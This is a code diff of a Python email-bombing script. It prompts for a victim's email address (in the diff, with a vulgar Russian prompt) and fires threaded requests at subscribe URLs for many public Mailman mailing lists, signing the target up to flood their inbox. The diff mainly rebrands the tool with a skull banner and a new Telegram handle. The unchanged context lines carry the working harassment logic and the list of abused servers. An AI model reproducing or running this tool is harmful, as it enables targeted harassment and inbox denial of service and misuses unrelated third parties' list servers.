@@ -19,15 +19,20 @@ def spam():
 
 
 print(colorama.Fore.GREEN + """
-___________                 .__ .__     _________                         
-\\_   _____/  _____  _____   |__||  |   /   _____/______ _____     _____   
- |    __)_  /     \\ \\__  \\  |  ||  |   \\_____  \\ \\____ \\__  \\   /     \\  
- |        \\|  Y Y  \\ / __ \\_|  ||  |__ /        \\|  |_> >/ __ \\_|  Y Y  \\ 
-/_______  /|__|_|  /(____  /|__||____//_______  /|   __/(____  /|__|_|  / 
-        \\/       \\/      \\/                   \\/ |__|        \\/       \\/  """ + colorama.Fore.CYAN + "\n 			by @anongroup and @wannadeauth (telegram) \n ----------------------------------\n\n")
+░└┐░░░░░░░░░░░░░░░░░┌┘░██
+██░░└┐░░░░░░░░░░░░░░░┌┘░░██
+██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
+██▌░│██████▌░░░▐██████│░▐██
+███░│▐███▀▀░░▄░░▀▀███▌│░███
+██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
+██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
+████▄─┘██▌░░░░░░░▐██└─▄████
+█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
+████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
+█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████  """ + colorama.Fore.CYAN + "\n 			 @WORLDHAK_666 (ТЕЛЕГА) \n ----------------------------------\n\n")
 
 
-spam_id = input(colorama.Fore.MAGENTA + "Type victim`s email here: " + colorama.Fore.WHITE)
+spam_id = input(colorama.Fore.MAGENTA + "НАПИШИ КОМУ ЕБАТЬ МОЗГИ: " + colorama.Fore.WHITE)
 urls = ["http://ml.ci.uc.pt/mailman/subscribe/archport?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
 ,"http://flybynews.com/mailman/subscribe/flybynews_flybynews.com?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
 ,"http://www.winehq.org/mailman/subscribe/wine-users?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
@@ -193,5 +198,5 @@ urls = ["http://ml.ci.uc.pt/mailman/subscribe/archport?email="+spam_id+"&fullnam
 ,"http://lists.umanitoba.ca/mailman/subscribe/student-weekly-bannatyne?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"
 ,"http://lists.umanitoba.ca/mailman/subscribe/student-weekly-fort-garry?email="+spam_id+"&fullname=&pw=123456789&pw-conf=123456789&language=en&digest=0&email-button=Subscribe"]
 
-for i in range(int(input(colorama.Fore.MAGENTA + "Type threads here (for example: 10): " + colorama.Fore.WHITE))):
+for i in range(int(input(colorama.Fore.MAGENTA + "МОЩНОСТЬ (ТУРБО ЕБАЛКА: 10): " + colorama.Fore.WHITE))):
 	threading.Thread(target=spam).start()
